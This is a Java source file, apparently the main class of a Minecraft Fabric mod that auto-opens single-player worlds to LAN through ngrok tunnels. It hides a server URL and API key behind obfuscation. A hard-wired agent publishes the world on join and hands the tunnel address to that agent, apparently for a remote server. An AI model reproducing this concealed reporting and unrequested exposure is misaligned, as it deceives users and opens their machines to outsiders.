package org.wsm.autolan;

import java.io.IOException;
import java.net.URI;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.function.Consumer;
import java.util.function.Function;
import java.util.function.Supplier;
import java.util.concurrent.CompletableFuture; // Added for CompletableFuture
import java.util.concurrent.ConcurrentHashMap;

import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.fabricmc.fabric.api.command.v2.ArgumentTypeRegistry;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents; // Added for SERVER_STOPPING
import org.apache.commons.text.StringSubstitutor;
import org.jetbrains.annotations.Nullable;

import org.wsm.autolan.TunnelType.TunnelException;
import org.wsm.autolan.agent.NgrokKeyManager; // Added for NgrokKeyManager.shutdown()
import org.wsm.autolan.command.argument.TunnelArgumentType;
import org.wsm.autolan.mixin.IntegratedServerAccessor;
import org.wsm.autolan.mixin.PlayerManagerAccessor;
import com.github.alexdlaird.ngrok.NgrokClient;

import me.shedaniel.autoconfig.AutoConfig;
import me.shedaniel.autoconfig.ConfigHolder;
import me.shedaniel.autoconfig.serializer.Toml4jConfigSerializer;
import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.LanServerPinger;
import net.minecraft.command.argument.serialize.ConstantArgumentSerializer;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.PlayerManager;
import net.minecraft.server.ServerNetworkIo;
import net.minecraft.server.dedicated.command.BanCommand;
import net.minecraft.server.dedicated.command.BanIpCommand;
import net.minecraft.server.dedicated.command.BanListCommand;
import net.minecraft.server.dedicated.command.DeOpCommand;
import net.minecraft.server.dedicated.command.OpCommand;
import net.minecraft.server.dedicated.command.PardonCommand;
import net.minecraft.server.dedicated.command.PardonIpCommand;
import net.minecraft.server.dedicated.command.WhitelistCommand;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import net.minecraft.text.Texts;
import net.minecraft.util.Identifier;
import net.minecraft.world.GameMode;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import com.mojang.authlib.GameProfile;
import org.wsm.autolan.gui.CustomOpenToLanScreen;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.screen.GameMenuScreen;
import net.minecraft.server.integrated.IntegratedServer;
import net.minecraft.util.NetworkUtils;
import net.minecraft.util.WorldSavePath;
import net.minecraft.world.World;
import net.minecraft.server.OperatorList;
import net.minecraft.server.OperatorEntry;
import org.wsm.autolan.agent.AutoLanAgent;
import org.wsm.autolan.manager.ConnectionManager;
import org.wsm.autolan.util.SecurityUtil;

public class AutoLan implements ModInitializer {
    public static final String MODID = "autolan";
    public static final Logger LOGGER = LoggerFactory.getLogger("AutoLan");

    // Жестко заданные параметры агента
    public static final boolean AGENT_ENABLED = true;
    
    // Обфусцированные значения для чувствительных данных
    // Эти значения сгенерированы с помощью SecurityUtil.safeObfuscate()
    private static final String SERVER_URL_OBFUSCATED = "5wsRJVeyD9IC0i5/RWk85YEt6cs0uKnUFZkNHSfKtZ0=";
    private static final String API_KEY_OBFUSCATED = "+D2oK69fiXQupqjYHH+EBw==";
    
    // Расшифрованные значения, доступные только во время выполнения
    public static String SERVER_URL;
    public static String API_KEY;
    
    // Статический блок инициализации для расшифровки чувствительных данных
    static {
        // Декодируем значения при загрузке класса
        SERVER_URL = SecurityUtil.safeDeobfuscate(SERVER_URL_OBFUSCATED);
        API_KEY = SecurityUtil.safeDeobfuscate(API_KEY_OBFUSCATED);
        
        // Логируем только замаскированные версии для безопасности
        LOGGER.debug("Инициализированы API параметры: URL={}, Key={}",
                SecurityUtil.maskSensitiveData(SERVER_URL),
                SecurityUtil.maskSensitiveData(API_KEY));
    }

    public static ConfigHolder<AutoLanConfig> CONFIG;
    public static AutoLanAgent AGENT;
    public static final Map<String, String> activeTunnels = new ConcurrentHashMap<>();
    public static NgrokClient NGROK_CLIENT;
    
    // Флаги для отслеживания пользовательских настроек LAN
    private static boolean userDefinedLanSettings = false;
    private static boolean userCommandsEnabled = false;
    private static GameMode userGameMode = GameMode.SURVIVAL;
    private static boolean userOnlineMode = true; 
    private static String userMotd = "";
    private static int userMaxPlayers = 8;
    private static int userPort = -1;
    private static boolean hasUserDefinedSettings = false;
    
    // Флаги для отслеживания состояния LAN сервера
    private static boolean isLanAlreadyStarted = false;
    private static boolean isLanAutoOpened = false;
    private static boolean manualSettingsMessageShown = false;
    private static boolean lanMessageShownInChat = false;
    private static boolean isLanOpenedManually = false; // Флаг, показывающий, был ли сервер открыт вручную
    private static boolean isLanPendingManualActivation = false; // Флаг ожидания подтверждения ручного запуска
    
    private static final String PUBLISH_STARTED_AUTOLAN_TEXT = "commands.publish.started.autolan";
    private static final String PUBLISH_STARTED_AUTOLAN_TUNNEL_TEXT = "commands.publish.started.autolan.tunnel";
    private static final String PUBLISH_PORT_CHANGE_FAILED_TEXT = "commands.publish.failed.port_change";
    private static final String PUBLISH_SAVED_TEXT = "commands.publish.saved";
    private static final String PUBLISH_SAVED_TUNNEL_TEXT = "commands.publish.saved.tunnel";
    private static final Text SERVER_STOPPED_TEXT = Text.translatable("multiplayer.disconnect.server_shutdown");

    public static String processMotd(MinecraftServer server, String rawMotd) {
        HashMap<String, String> motdMap = new HashMap<>();
        motdMap.put("username", server.getHostProfile().getName());
        motdMap.put("world", server.getSaveProperties().getLevelName());
        StringSubstitutor motdSubstitutor = new StringSubstitutor(motdMap);
        return motdSubstitutor.replace(rawMotd)
                // Replace unescaped ampersands with section signs.
                .replaceAll("((?:[^&]|^)(?:&&)*)&(?!&)", "$1§").replace("&&", "&");
    }

    public static void startOrSaveLan(MinecraftServer server, GameMode gameMode, boolean onlineMode,
            TunnelType tunnel, int port, int maxPlayers, String rawMotd, Consumer<Text> onSuccess,
            Runnable onFatalError, Consumer<Text> onNonFatalError) {
        AutoLanServerValues serverValues = (AutoLanServerValues) server;
        PlayerManager playerManager = server.getPlayerManager();

        // Определяем, является ли это ручным вызовом
        boolean isManualCall = !isLanAutoOpened || (isLanAutoOpened && !manualSettingsMessageShown);
        
        // Проверяем, был ли уже запущен LAN в текущей сессии
        if (isLanAlreadyStarted && !isManualCall) {
            // Если LAN уже был автоматически запущен, блокируем повторный автоматический запуск
            LOGGER.warn("[AutoLan] [LAN_START] Попытка повторного автоматического запуска LAN заблокирована. Перезапустите мир для изменения настроек.");
            return;
        }
        
        // Если это ручной вызов после автоматического запуска, разрешаем изменение настроек 
        // и помечаем, что сообщение о ручной настройке должно быть показано 
        if (isLanAlreadyStarted && isManualCall) {
            LOGGER.info("[AutoLan] [LAN_START] Ручное изменение настроек после автоматического запуска");
            manualSettingsMessageShown = true;
            // При ручном изменении настроек всегда сбрасываем флаг сообщения в чате,
            // чтобы сообщение выводилось повторно
            lanMessageShownInChat = false;
        }
        
        // Создаем обертку для onSuccess, которая будет устанавливать флаг lanMessageShownInChat
        Consumer<Text> onSuccessWrapper = (text) -> {
            // Для автоматического запуска проверяем флаг, для ручного - всегда показываем
            if (!lanMessageShownInChat || isManualCall) {
                onSuccess.accept(text);
                lanMessageShownInChat = true;
                LOGGER.info("[AutoLan] [CHAT_MESSAGE] Сообщение о запуске LAN показано в чате (ручной вызов: {})", isManualCall);
            } else {
                LOGGER.info("[AutoLan] [CHAT_MESSAGE] Сообщение о запуске LAN уже было показано ранее, пропускаем");
            }
        };

        server.setOnlineMode(onlineMode);
        
        // Установка флага customCommandsAllowed
        boolean effectiveCommandsAllowed;
        
        // Проверяем, вызван ли этот метод из команды publish при автоматическом запуске
        // или при ручном изменении настроек через экран "Открыть для LAN"
        if (hasUserDefinedSettings()) {
            // Используем сохраненные настройки пользователя
            effectiveCommandsAllowed = getUserCommandsEnabled();
            
            // Обновляем также стандартный флаг areCommandsAllowed для совместимости
            ((SetCommandsAllowed) server.getSaveProperties()).setCommandsAllowed(effectiveCommandsAllowed);
            
            LOGGER.info("[AutoLan] [PUBLISH_COMMAND] Применяем пользовательские настройки: commandsEnabled={}", effectiveCommandsAllowed);
        } else {
            // Используем текущее значение, которое должно быть уже установлено
            effectiveCommandsAllowed = server.getSaveProperties().areCommandsAllowed();
            LOGGER.info("[AutoLan] [PUBLISH_COMMAND] Используем стандартные настройки: areCommandsAllowed={}", effectiveCommandsAllowed);
        }
        
        try {
            if (server.getOverworld() != null && server.getOverworld().getPersistentStateManager() != null) {
                AutoLanState state = server.getOverworld().getPersistentStateManager().getOrCreate(AutoLanState.STATE_TYPE);
                state.setCustomCommandsAllowed(effectiveCommandsAllowed);
                LOGGER.info("[AutoLan] [PUBLISH_COMMAND] Установлен флаг customCommandsAllowed = {}", effectiveCommandsAllowed);
            }
        } catch (Exception e) {
            LOGGER.error("[AutoLan] [PUBLISH_COMMAND] Ошибка при установке флага customCommandsAllowed", e);
        }

        ((PlayerManagerAccessor) playerManager).setMaxPlayers(maxPlayers);

        String oldMotd = server.getServerMotd();
        String motd = processMotd(server, rawMotd);
        serverValues.setRawMotd(rawMotd);
        server.setMotd(motd);
        // Metadata doesn't get updated automatically.
        server.forcePlayerSampleUpdate();

        if (server.isRemote()) { // Already opened to LAN
            int oldPort = server.getServerPort();
            boolean portChanged = false;
            if (port != oldPort) {
                ServerNetworkIo networkIo = server.getNetworkIo();
                try {
                    networkIo.bind(null, port); // Checks that the port works.
                    networkIo.stop(); // Stops listening on the port, but does not close any existing connections.
                    networkIo.bind(null, port); // Actually starts listening on the new port.
                    ((IntegratedServerAccessor) server).setLanPort(port);
                    portChanged = true;
                } catch (IOException e) {
                    onNonFatalError.accept(Text.translatable(PUBLISH_PORT_CHANGE_FAILED_TEXT,
                            Texts.bracketedCopyable(String.valueOf(oldPort))));
                }
            }

            if (portChanged || !motd.equals(oldMotd)) {
                // Restart the LAN pinger as its properties are immutable.
                ((IntegratedServerAccessor) server).getLanPinger().interrupt();
                try {
                    LanServerPinger lanPinger = new LanServerPinger(motd, Integer.toString(server.getServerPort()));
                    ((IntegratedServerAccessor) server).setLanPinger(lanPinger);
                    lanPinger.start();
                } catch (IOException e) {
                    // The LAN pinger not working isn't the end of the world.
                }
            }

            server.setDefaultGameMode(gameMode);
            // The players' permissions may have changed, so send the new command trees.
            for (ServerPlayerEntity player : playerManager.getPlayerList()) {
                playerManager.sendCommandTree(player);
            }
            
            // КРИТИЧЕСКИ ВАЖНО: обновляем права хоста также при изменении настроек уже открытого LAN
            updatePermissionsAfterLanStart(server);
            
            // Если LAN был открыт вручную, применяем принудительно игровой режим для всех игроков
            if (isLanOpenedManually) {
                LOGGER.info("[AutoLan] [GAMEMODE] Принудительно применяем игровой режим {} для игроков (ручное открытие)", gameMode);
                applyGameModeToAllPlayers(server, gameMode);
            }

            TunnelType oldTunnel = serverValues.getTunnelType();
            if (tunnel != oldTunnel || portChanged) {
                try {
                    oldTunnel.stop(server);
                } catch (TunnelException e) {
                    onNonFatalError.accept(e.getMessageText());
                }

                try {
                    String tunnelUrl = tunnel.start(server);
                    serverValues.setTunnelType(tunnel);
                    
                    Text tunnelText = null;
                    if (tunnelUrl != null) {
                        activeTunnels.clear();
                        activeTunnels.put("minecraft", tunnelUrl);
                        tunnelText = Texts.bracketedCopyable(tunnelUrl.replaceFirst("^tcp:\\/\\/", ""));
                        
                        // Обновляем информацию о туннеле в агенте
                        if (AGENT != null) {
                            AGENT.updateTunnelUrl("minecraft", tunnelUrl);
                        }
                    }
                    serverValues.setTunnelText(tunnelText);

                    if (tunnelText != null) {
                        onSuccessWrapper.accept(Text.translatable(PUBLISH_SAVED_TUNNEL_TEXT,
                                Texts.bracketedCopyable(String.valueOf(server.getServerPort())), tunnelText, motd));
                    } else {
                        onSuccessWrapper.accept(Text.translatable(PUBLISH_SAVED_TEXT,
                                Texts.bracketedCopyable(String.valueOf(server.getServerPort())), motd));
                    }
                } catch (TunnelException e) {
                    onSuccessWrapper.accept(Text.translatable(PUBLISH_SAVED_TEXT,
                            Texts.bracketedCopyable(String.valueOf(server.getServerPort())), motd));
                    onNonFatalError.accept(e.getMessageText());
                }
            } else {
                if (serverValues.getTunnelText() != null) {
                    onSuccessWrapper.accept(Text.translatable(PUBLISH_SAVED_TUNNEL_TEXT,
                            Texts.bracketedCopyable(String.valueOf(server.getServerPort())),
                            serverValues.getTunnelText(), motd));
                } else {
                    onSuccessWrapper.accept(Text.translatable(PUBLISH_SAVED_TEXT,
                            Texts.bracketedCopyable(String.valueOf(server.getServerPort())), motd));
                }
            }
        } else {
            if (server.openToLan(gameMode, false, port)) {
                server.setDefaultGameMode(gameMode); // Prevents the gamemode from being forced.

                try {
                    String tunnelUrl = tunnel.start(server);
                    serverValues.setTunnelType(tunnel);
                    
                    Text tunnelText = null;
                    if (tunnelUrl != null) {
                        activeTunnels.clear();
                        activeTunnels.put("minecraft", tunnelUrl);
                        tunnelText = Texts.bracketedCopyable(tunnelUrl.replaceFirst("^tcp:\\/\\/", ""));
                        
                        // Обновляем информацию о туннеле в агенте
                        if (AGENT != null) {
                            AGENT.updateTunnelUrl("minecraft", tunnelUrl);
                        }
                    }
                    serverValues.setTunnelText(tunnelText);

                    if (tunnelText != null) {
                        onSuccessWrapper.accept(Text.translatable(PUBLISH_STARTED_AUTOLAN_TUNNEL_TEXT,
                                Texts.bracketedCopyable(String.valueOf(server.getServerPort())), tunnelText, motd));
                    } else {
                        onSuccessWrapper.accept(Text.translatable(PUBLISH_STARTED_AUTOLAN_TEXT,
                                Texts.bracketedCopyable(String.valueOf(server.getServerPort())), motd));
                    }
                } catch (TunnelException e) {
                    onSuccessWrapper.accept(Text.translatable(PUBLISH_STARTED_AUTOLAN_TEXT,
                            Texts.bracketedCopyable(String.valueOf(server.getServerPort())), motd));
                    onNonFatalError.accept(e.getMessageText());
                }
                
                // КРИТИЧЕСКИ ВАЖНО: после запуска LAN сервера нужно обновить права хоста и других игроков
                updatePermissionsAfterLanStart(server);
                
                // Если LAN был открыт вручную, применяем принудительно игровой режим для всех игроков
                if (isLanOpenedManually) {
                    LOGGER.info("[AutoLan] [GAMEMODE] Принудительно применяем игровой режим {} для игроков (ручное открытие)", gameMode);
                    applyGameModeToAllPlayers(server, gameMode);
                }
                
                // Устанавливаем флаг, что LAN был запущен в этой сессии
                isLanAlreadyStarted = true;
                LOGGER.info("[AutoLan] [LAN_START] LAN успешно запущен, повторный запуск будет заблокирован до перезагрузки мира");
                
            } else {
                onFatalError.run();
            }
            // Update the window title to have " - Multiplayer (LAN)".
            MinecraftClient.getInstance().updateWindowTitle();
        }
    }

    public static void stopLan(MinecraftServer server, Runnable onSuccess,
            Runnable onFatalError, Consumer<Text> onNonFatalError) {
        AutoLanServerValues serverValues = (AutoLanServerValues) server;

        // Disconnect the connected players.
        UUID localPlayerUuid = ((IntegratedServerAccessor) server).getLocalPlayerUuid();
        PlayerManager playerManager = server.getPlayerManager();
        List<ServerPlayerEntity> playerList = new ArrayList<>(playerManager.getPlayerList()); // Needs to be cloned!
        for (ServerPlayerEntity player : playerList) {
            if (!player.getUuid().equals(localPlayerUuid)) {
                player.networkHandler.disconnect(SERVER_STOPPED_TEXT);
            }
        }

        server.getNetworkIo().stop(); // Stops listening on the port, but does not close any existing connections.
        ((IntegratedServerAccessor) server).setLanPort(-1);
        ((IntegratedServerAccessor) server).getLanPinger().interrupt();

        // Сбрасываем все флаги состояния LAN при остановке
        isLanAlreadyStarted = false;
        isLanOpenedManually = false;
        LOGGER.info("[AutoLan] [LAN_STOP] LAN сервер остановлен, флаги сброшены");

        onSuccess.run();

        try {
            serverValues.getTunnelType().stop(server);
            serverValues.setTunnelType(TunnelType.NONE);
            serverValues.setTunnelText(null);
        } catch (TunnelException e) {
            onNonFatalError.accept(e.getMessageText());
        }

        // Update the window title to bring back " - Singleplayer".
        MinecraftClient.getInstance().updateWindowTitle();
    }

    @Override
    public void onInitialize() {
        LOGGER.info("[AutoLan] Инициализация мода AutoLan");
        Thread ngrokInstallThread = new Thread(() -> new NgrokClient.Builder().build());
        ngrokInstallThread.start();
        AutoConfig.register(AutoLanConfig.class, Toml4jConfigSerializer::new);
        CONFIG = AutoConfig.getConfigHolder(AutoLanConfig.class);
        
        // Инициализация агента будет отложена до входа в мир IntegratedServer

        // Регистрация команд для режима интегрированного сервера
        CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> {
            if (environment.integrated) {
                OpCommand.register(dispatcher);
                DeOpCommand.register(dispatcher);
                BanCommand.register(dispatcher);
                BanIpCommand.register(dispatcher);
                BanListCommand.register(dispatcher);
                PardonCommand.register(dispatcher);
                PardonIpCommand.register(dispatcher);
                WhitelistCommand.register(dispatcher);
            }
        });
        
        // Регистрация аргумента туннеля
        ArgumentTypeRegistry.registerArgumentType(Identifier.of(MODID, "tunnel"), TunnelArgumentType.class,
                ConstantArgumentSerializer.of(TunnelArgumentType::tunnel));

        // --- New Event Handling Logic ---

        // Server Start Event (Integrated Server Ready)
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            MinecraftClient mc = MinecraftClient.getInstance();
            // Эта проверка должна быть здесь, чтобы onIntegratedServerReady вызывался только один раз
            // когда интегрированный сервер действительно готов и доступен через client.getServer().
            if (mc.isIntegratedServerRunning() && mc.getServer() != null) {
                LOGGER.info("[AutoLan] ClientPlayConnectionEvents.JOIN: Integrated server detected.");
                // Передаем управление методу onIntegratedServerReady
                // mc.execute() не нужен здесь, так как onIntegratedServerReady будет управлять потоками
                onIntegratedServerReady(mc.getServer());
            } else {
                LOGGER.info("[AutoLan] ClientPlayConnectionEvents.JOIN: Not an integrated server or server is null. No action taken.");
            }
        });

        // Server Stop Event
        ServerLifecycleEvents.SERVER_STOPPING.register(AutoLan::onServerStopping);

        // Client Disconnect Event (from any server)
        ClientPlayConnectionEvents.DISCONNECT.register((handler, client) -> {
            LOGGER.info("[AutoLan] ClientPlayConnectionEvents.DISCONNECT: Player disconnected from a server.");
            // Если агент был активен (т.е. это был наш интегрированный сервер), деактивируем его.
            if (AGENT != null) {
                LOGGER.info("[AutoLan] Setting AutoLanAgent world state to inactive due to client disconnect.");
                AGENT.setWorldActive(false);
                // Не останавливаем туннели и не выключаем агент полностью здесь,
                // это должно произойти при ServerLifecycleEvents.SERVER_STOPPING.
            }
            // Сброс пользовательских настроек LAN при выходе из любого мира/сервера.
            resetUserLanSettings();
            LOGGER.info("[AutoLan] User LAN settings reset on disconnect.");
        });
        
        // Shutdown Hook - Fallback for ensuring resources are cleaned up
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            LOGGER.info("[AutoLan] JVM Shutdown Hook initiated.");
            // Вызываем onServerStopping с null, так как сервер может быть уже недоступен.
            // onServerStopping должен быть готов к этому.
            onServerStopping(null);
            // Дополнительно убеждаемся, что статические менеджеры executor'ов выключены.
            // Эти вызовы должны быть идемпотентны.
            AutoLanAgent.shutdownAgentExecutor(); // Статический метод для остановки AGENT_EXECUTOR
            NgrokKeyManager.shutdown(); // Статический метод для остановки KEY_RETRIEVAL_EXECUTOR
            LOGGER.info("[AutoLan] JVM Shutdown Hook completed.");
        }));

        LOGGER.info("[AutoLan] Mod loaded and event handlers registered!");
    }

    /**
     * Called when an integrated server is ready (player has joined their single-player world).
     * Responsible for initializing the AutoLanAgent and starting the LAN publishing process.
     */
    private static void onIntegratedServerReady(MinecraftServer server) {
        LOGGER.info("[AutoLan] onIntegratedServerReady: Preparing to initialize AutoLanAgent and publish LAN.");

        if (!AGENT_ENABLED) {
            LOGGER.info("[AutoLan] AutoLan AGENT is disabled via AGENT_ENABLED=false. No action will be taken.");
            return;
        }

        if (AGENT != null) {
            LOGGER.warn("[AutoLan] onIntegratedServerReady called, but AGENT already exists. This might indicate a previous unclean shutdown or multiple join events. Attempting to reuse existing agent.");
            // Если агент уже существует, возможно, просто активируем его и пытаемся опубликовать.
            // Однако, это состояние не должно возникать при правильной логике SERVER_STOPPING.
             AGENT.setWorldActive(true);
            // Повторная публикация, если сервер уже был запущен, может быть не нужна или должна управляться иначе.
            // Для простоты, пока вызываем publish.
            server.getCommandManager().executeWithPrefix(server.getCommandSource(), "publish");
            return;
        }

        LOGGER.info("[AutoLan] Creating new AutoLanAgent instance.");
        AGENT = new AutoLanAgent();
        AGENT.init().thenRunAsync(() -> {
            LOGGER.info("[AutoLan] AutoLanAgent initialized successfully via CompletableFuture.");
            if (AGENT != null) { // Перепроверка на случай, если AGENT был обнулен в exceptionally
                AGENT.setWorldActive(true);
                LOGGER.info("[AutoLan] AutoLanAgent world status set to active.");
                LOGGER.info("[AutoLan] Executing /publish command on server thread.");
                server.getCommandManager().executeWithPrefix(server.getCommandSource(), "publish");
            } else {
                 LOGGER.error("[AutoLan] AGENT became null after successful init chain. Publish command skipped.");
            }
        }, server) // server::execute shorthand for running on server thread
        .exceptionally(ex -> {
            LOGGER.error("[AutoLan] Failed to initialize AutoLanAgent or publish LAN.", ex);
            if (AGENT != null) {
                AGENT.shutdown(); // Попытка очистить ресурсы агента
                AGENT = null;
            }
            // Можно добавить сообщение для игрока здесь, если это уместно
            // server.getPlayerManager().broadcast(Text.literal("AutoLan failed to start: " + ex.getMessage()), false);
            return null;
        });
    }

    /**
     * Called when a Minecraft server (specifically our integrated server) is stopping.
     * Responsible for shutting down the AutoLanAgent, stopping tunnels, and cleaning up resources.
     * @param server The server instance that is stopping. Can be null if called from shutdown hook late.
     */
    private static void onServerStopping(@Nullable MinecraftServer server) {
        LOGGER.info("[AutoLan] onServerStopping: Server is stopping. Cleaning up AutoLan resources.");

        if (AGENT != null) {
            LOGGER.info("[AutoLan] Shutting down AutoLanAgent...");
            AGENT.setWorldActive(false); // Signal agent to stop activities like heartbeats
            AGENT.shutdown();           // Perform agent-specific cleanup (e.g., release ngrok key)
            AGENT = null;
            LOGGER.info("[AutoLan] AutoLanAgent shut down and instance set to null.");
        } else {
            LOGGER.info("[AutoLan] AutoLanAgent was already null. No agent shutdown needed.");
        }

        // Stop tunnels, passing the server instance if available
        // stopTunnels now takes server argument
        stopTunnels(server);

        // Shutdown static executors. These calls should be safe even if already shutdown.
        LOGGER.info("[AutoLan] Shutting down static executors for AutoLanAgent and NgrokKeyManager.");
        AutoLanAgent.shutdownAgentExecutor(); // Ensure this static method exists in AutoLanAgent
        NgrokKeyManager.shutdown();           // Ensure this static method exists in NgrokKeyManager
        
        activeTunnels.clear(); // Очищаем список активных туннелей в любом случае
        LOGGER.info("[AutoLan] Active tunnels map cleared.");
        LOGGER.info("[AutoLan] Cleanup on server stop completed.");
    }


    /**
     * Останавливает все активные туннели.
     * @param server The MinecraftServer instance, can be null if called from a context where server is not available.
     */
    private static void stopTunnels(@Nullable MinecraftServer server) {
        LOGGER.info("[AutoLan] Attempting to stop tunnels...");
        if (server != null && server instanceof AutoLanServerValues) {
            AutoLanServerValues serverValues = (AutoLanServerValues) server;
            TunnelType tunnelType = serverValues.getTunnelType();

            if (tunnelType != null && tunnelType != TunnelType.NONE) {
                LOGGER.info("[AutoLan] Stopping tunnel type: {}", tunnelType);
                try {
                    tunnelType.stop(server); // tunnelType.stop() should handle ngrok process killing
                    serverValues.setTunnelType(TunnelType.NONE);
                    serverValues.setTunnelText(null);
                    LOGGER.info("[AutoLan] Tunnel type {} stopped successfully.", tunnelType);
                } catch (TunnelType.TunnelException e) {
                    LOGGER.error("[AutoLan] Error stopping tunnel type {}:", tunnelType, e);
                }
            } else {
                LOGGER.info("[AutoLan] No active tunnel type or server not AutoLanServerValues. Skipping specific tunnel stop.");
            }
        } else {
             LOGGER.warn("[AutoLan] Cannot stop tunnels: Server is null or not an instance of AutoLanServerValues.");
        }
        
        // Fallback: Пытаемся убить ngrok клиент напрямую, если он существует.
        // Это особенно важно, если tunnelType.stop() не справился или сервер был null.
        if (NGROK_CLIENT != null) {
            LOGGER.info("[AutoLan] Attempting to kill NGROK_CLIENT directly as a fallback.");
            try {
                NGROK_CLIENT.kill();
                LOGGER.info("[AutoLan] NGROK_CLIENT killed successfully.");
            } catch (Exception e) {
                LOGGER.error("[AutoLan] Failed to kill NGROK_CLIENT directly:", e);
            } finally {
                NGROK_CLIENT = null; // Обнуляем в любом случае
            }
        }
        
        // Очищаем список активных туннелей, если он не был очищен ранее
        if (!activeTunnels.isEmpty()) {
            activeTunnels.clear();
            LOGGER.info("[AutoLan] Active tunnels map cleared in stopTunnels.");
        }
        LOGGER.info("[AutoLan] Tunnel stopping process completed.");
    }

    /**
     * Добавляет диагностический хук для отслеживания вызовов проверки прав.
     * Может быть вызван из миксинов для логирования важных операций.
     */
    public static void logPermissionCheck(String source, GameProfile profile, MinecraftServer server, boolean result) {
        LOGGER.info("[AutoLan] [PERMISSION_DEBUG] Источник: {}, Игрок: '{}' (UUID: {})", 
                   source, profile.getName(), profile.getId());
        LOGGER.info("[AutoLan] [PERMISSION_DEBUG] Статус сервера: isRemote={}, areCommandsAllowed={}, isHost={}", 
                   server.isRemote(), 
                   server.getSaveProperties().areCommandsAllowed(),
                   server.isHost(profile));
                   
        // Проверяем также значение собственного флага
        boolean customCommandsAllowed = false;
        try {
            if (server.getOverworld() != null && server.getOverworld().getPersistentStateManager() != null) {
                AutoLanState state = server.getOverworld().getPersistentStateManager().getOrCreate(AutoLanState.STATE_TYPE);
                customCommandsAllowed = state.getCustomCommandsAllowed();
                LOGGER.info("[AutoLan] [PERMISSION_DEBUG] CustomCommandsAllowed={}", customCommandsAllowed);
            }
        } catch (Exception e) {
            // Тихая обработка ошибки
        }
        
        LOGGER.info("[AutoLan] [PERMISSION_RESULT] Итоговое решение: {}, Игрок: '{}'", 
                   result ? "РАЗРЕШЕНО" : "ЗАПРЕЩЕНО", profile.getName());
    }

    /**
     * Открывает модифицированный экран "Открыть для LAN"
     * 
     * @param parent Родительский экран, обычно GameMenuScreen
     */
    public static void openCustomLanScreen(Screen parent) {
        if (parent instanceof GameMenuScreen) {
            MinecraftClient.getInstance().setScreen(new CustomOpenToLanScreen(parent));
            LOGGER.info("[AutoLan] Открыт собственный экран 'Открыть для сети'");
        }
    }

    /**
     * Сохраняет флаг разрешения команд для последующего использования.
     * Использует текущие значения других параметров.
     * 
     * @param commandsEnabled Разрешены ли команды
     */
    public static void saveUserLanSettings(boolean commandsEnabled) {
        // Сохраняем commandsEnabled, но не меняем другие настройки
        userCommandsEnabled = commandsEnabled;
        hasUserDefinedSettings = true;
        
        LOGGER.info("[AutoLan] [SETTINGS] Сохранен флаг разрешения команд: commandsEnabled={}, сохранены существующие настройки gameMode={}", 
                  commandsEnabled, userGameMode);
    }
    
    /**
     * Сохраняет расширенные пользовательские настройки LAN для последующего использования.
     * 
     * @param commandsEnabled Разрешены ли команды
     * @param gameMode Режим игры
     * @param onlineMode Проверка подлинности аккаунтов
     * @param motd Описание сервера
     * @param maxPlayers Максимальное количество игроков
     * @param port Порт сервера
     */
    public static void saveUserLanSettings(boolean commandsEnabled, GameMode gameMode, boolean onlineMode, 
                                          String motd, int maxPlayers, int port) {
        userCommandsEnabled = commandsEnabled;
        userGameMode = gameMode;
        userOnlineMode = onlineMode;
        userMotd = motd;
        userMaxPlayers = maxPlayers;
        userPort = port;
        hasUserDefinedSettings = true;
        
        LOGGER.info("[AutoLan] [SETTINGS] Сохранены расширенные настройки LAN: commandsEnabled={}, gameMode={}, maxPlayers={}, port={}",
                  commandsEnabled, gameMode, maxPlayers, port);
    }
    
    /**
     * Проверяет, были ли ранее сохранены пользовательские настройки LAN.
     * 
     * @return true если настройки были сохранены
     */
    public static boolean hasUserDefinedSettings() {
        return hasUserDefinedSettings;
    }
    
    /**
     * Возвращает сохраненное пользовательское значение флага разрешения команд.
     * 
     * @return true если команды разрешены
     */
    public static boolean getUserCommandsEnabled() {
        return userCommandsEnabled;
    }
    
    /**
     * Возвращает сохраненный пользовательский режим игры.
     * 
     * @return режим игры
     */
    public static GameMode getUserGameMode() {
        return userGameMode;
    }
    
    /**
     * Возвращает сохраненное значение онлайн-режима.
     * 
     * @return true если включена проверка подлинности аккаунтов
     */
    public static boolean getUserOnlineMode() {
        return userOnlineMode;
    }
    
    /**
     * Возвращает сохраненное описание сервера.
     * 
     * @return MOTD сервера
     */
    public static String getUserMotd() {
        return userMotd;
    }
    
    /**
     * Возвращает сохраненное максимальное количество игроков.
     * 
     * @return максимальное количество игроков
     */
    public static int getUserMaxPlayers() {
        return userMaxPlayers;
    }
    
    /**
     * Возвращает сохраненный порт сервера.
     * 
     * @return порт сервера или -1, если не задан
     */
    public static int getUserPort() {
        return userPort;
    }

    /**
     * Обновляет права игроков после запуска LAN сервера.
     * Это необходимо, поскольку Minecraft не пересчитывает права автоматически
     * после изменения флагов разрешения команд.
     * 
     * @param server Сервер Minecraft
     */
    private static void updatePermissionsAfterLanStart(MinecraftServer server) {
        try {
            // Права игроков должны быть обновлены после запуска сервера или изменения настроек
            // (удалена проверка isLanAlreadyStarted, чтобы права обновлялись всегда)
            
            PlayerManager pm = server.getPlayerManager();
            
            // Получаем значение флага customCommandsAllowed
            boolean customCommandsAllowed = false;
            
            try {
                if (server.getOverworld() != null && server.getOverworld().getPersistentStateManager() != null) {
                    AutoLanState state = server.getOverworld().getPersistentStateManager().getOrCreate(AutoLanState.STATE_TYPE);
                    customCommandsAllowed = state.getCustomCommandsAllowed();
                }
            } catch (Exception e) {
                LOGGER.error("[AutoLan] [PERMISSION_UPDATE] Ошибка при получении customCommandsAllowed", e);
            }
            
            // Проверяем стандартный флаг для отладки
            boolean standardCommandsAllowed = server.getSaveProperties().areCommandsAllowed();
            
            // Логируем состояние флагов
            LOGGER.info("[AutoLan] [PERMISSION_UPDATE] Обновление прав после запуска LAN:");
